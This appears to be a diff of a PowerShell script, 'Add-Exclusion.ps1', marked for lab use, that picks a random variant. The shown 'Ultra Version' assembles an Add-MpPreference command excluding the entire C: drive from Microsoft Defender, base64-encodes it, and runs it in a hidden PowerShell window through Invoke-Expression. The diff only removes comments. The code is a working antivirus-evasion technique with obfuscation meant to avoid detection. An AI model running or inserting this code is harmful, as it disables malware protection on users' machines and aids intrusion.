@@ -1,7 +1,6 @@
 # PowerShell Script: Add-Exclusion.ps1
 # LAB PURPOSE ONLY
 
-# Randomly pick a version
 $version = Get-Random -Minimum 1 -Maximum 5
 
 Write-Host "Selected Version: $version" -ForegroundColor Cyan
@@ -25,23 +24,18 @@ switch ($version) {
     4 {
         # 4 - Ultra Version (Obfuscated + Encoded + Variable Tricks)
         
-        # Create dynamic pieces
         $p1 = 'Add'
         $p2 = '-Mp'
         $p3 = 'Preference'
         $fullCommand = "$p1$p2$p3 -ExclusionPath C:\"
 
-        # Encode full command
         $bytesUltra = [System.Text.Encoding]::Unicode.GetBytes($fullCommand)
         $encodedUltra = [Convert]::ToBase64String($bytesUltra)
 
-        # Set environment variable to hold encoded payload
         $env:payload = $encodedUltra
 
-        # Build runner dynamically
         $runner = 'powershell.exe -NoP -NonI -W Hidden -EncodedCommand ' + $env:payload
 
-        # Execute
         Invoke-Expression $runner
     }
 }
